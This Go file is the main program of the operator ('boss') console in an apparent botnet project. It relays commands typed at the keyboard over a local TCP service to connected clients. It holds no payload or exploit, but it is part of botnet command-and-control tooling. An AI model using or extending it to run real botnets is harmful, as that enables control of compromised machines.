package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/phanletrunghieu/botnet/boss/service/tcp"
	"github.com/phanletrunghieu/botnet/common/cmd"
)

func main() {
	bossService := tcp.NewTCPService("127.0.0.1", 8081)
	go func() {
		err := <-bossService.Error
		log.Println(err)
	}()

	go func() {
		err := <-bossService.ReadChan
		log.Println(err)
	}()

	go bossService.Run()

	for {
		stdreader := bufio.NewReader(os.Stdin)
		text, err := stdreader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading input", err)
			continue
		}

		switch strings.TrimSpace(text) {
		case "list client":
			bossService.WriteChan <- (cmd.ListBosses)
			break
		default:
			bossService.WriteChan <- text
		}
	}
}
